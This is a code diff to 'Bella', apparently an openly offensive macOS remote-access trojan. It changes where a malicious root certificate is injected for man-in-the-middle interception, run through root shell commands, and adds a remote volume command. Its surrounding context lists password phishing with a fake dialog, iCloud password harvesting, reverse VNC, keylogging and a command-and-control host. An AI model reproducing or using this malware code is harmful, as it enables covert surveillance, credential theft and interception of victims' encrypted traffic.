@@ -404,17 +404,17 @@ def cert_inject(cert):
 	with open('%scert.crt' % cPath, 'w') as content:
 		content.write(cert)
 	temp_file_list.append(cPath)
-	(success, msg) = do_root("security add-trusted-cert -d -r trustRoot -k /System/Library/Keychains/SystemRootCertificates.keychain %scert.crt" % cPath)
+	(success, msg) = do_root("security add-trusted-cert -d -r trustRoot -k /Library/Keychains/System.keychain %scert.crt" % cPath)
 	if not success:
-		return "%sError injecting root CA into System Keychain:\n%s" % (red_minus, msg)
+		return "%sError injecting root CA into login Keychain:\n%s" % (red_minus, msg)
 	payload_cleaner()
-	return "%sCertificate Authority injected into System Keychain!\n" % yellow_star
+	return "%sCertificate Authority injected into login Keychain!\n" % yellow_star
 
 def cert_remove(shahash):
-	(success, msg) = do_root("security delete-certificate -Z %s /System/Library/Keychains/SystemRootCertificates.keychain" % shahash)
+	(success, msg) = do_root("security delete-certificate -Z %s /Library/Keychains/System.keychain" % shahash)
 	if not success:
-		return "%sError removing root CA from System Keychain:\n%s" % (red_minus, msg)
-	return "%sCertificate Authority removed from System Keychain!\n" % yellow_star
+		return "%sError removing root CA from login Keychain:\n%s" % (red_minus, msg)
+	return "%sCertificate Authority removed from login Keychain!\n" % yellow_star
 
 def check_current_users():
 	output = check_output("w -h | sort -u -t' ' -k1,1 | awk {'print $1'}")
@@ -1076,6 +1076,7 @@ def manual():
 	value += "\n%sUpdate Server%s\nUpdate the remote Bella server with a specified payload.\nUsage: %supdate_server%s\nRequirements: None.\n" % (underline + bold + yellow, endANSI, bold, endANSI)
 	value += "\n%sUpdate DB Entry%s\nUpdate the database entry for iCloud password or user password.\nUsage: %supdate_db_entry%s\nRequirements: None.\n" % (underline + bold + blue, endANSI, bold, endANSI)
 	value += "\n%sUser Pass Phish%s\nWill phish the user for their password with a clever dialog.\nUsage: %suser_pass_phish%s\nRequirements: None.\n" % (underline + bold + yellow, endANSI, bold, endANSI)
+	value += "\n%sVolume Set%s\nSet the speaker volume on the remote machine.\nUsage: %svolume%s\nRequirements: None.\n" % (underline + bold + yellow, endANSI, bold, endANSI)
 	value += "\n%sVNC%s\nStart a reverse VNC connection over port 5500.\nUsage: %svnc%s\nRequirements: VNC Viewer for macOS.\n" % (underline + bold + yellow, endANSI, bold, endANSI)
 	#value += "\n%sKey Start%s\nBegin keylogging in the background.\nUsage: %skeyStart%s (requires root)\n" % (underline + bold, endANSI, bold, endANSI)
 	#value += "\n%sKey Kill%s\nStop keylogging started through Key Start\nUsage: %skeyStart%s (requires root)\n" % (underline + bold, endANSI, bold, endANSI)
@@ -1110,6 +1111,7 @@ def mitm_kill(interface, certsha1):
 	if not x[0]:
 		if x[2] == 8:
 			send_msg("%sThe interface [%s] does not exist." % (red_minus, interface), True)
+			return
 		send_msg(x[1], True)
 	if "Enabled: No" in x[1]:
 		send_msg("%s\033[4mAlready disabled!\033[0m %s\n%s" % (yellow_star, yellow_star, x[1]), True)
@@ -1156,10 +1158,10 @@ def mitm_start(interface, cert):
 	if not x[0]:
 		if x[2] == 8:
 			send_msg("%sThe interface [%s] does not exist." % (red_minus, interface), True)
+			return
 		send_msg(x[1], True)
 	if "Enabled: Yes" in x[1]:
 		send_msg("%s\033[4mAlready enabled!\033[0m %s\n%s" % (yellow_star, yellow_star, x[1]), True)
-		send_msg('', True)
 		return
 
 	cert = cert_inject(cert)
@@ -2384,7 +2386,7 @@ payload_list = []
 temp_file_list = []
 host = '127.0.0.1' #Command and Control IP (listener will run on)
 port = 4545 #What port Bella will operate over
-bella_version = '1.20'
+bella_version = '1.21'
 
 #### End global variables ####
 if __name__ == '__main__':
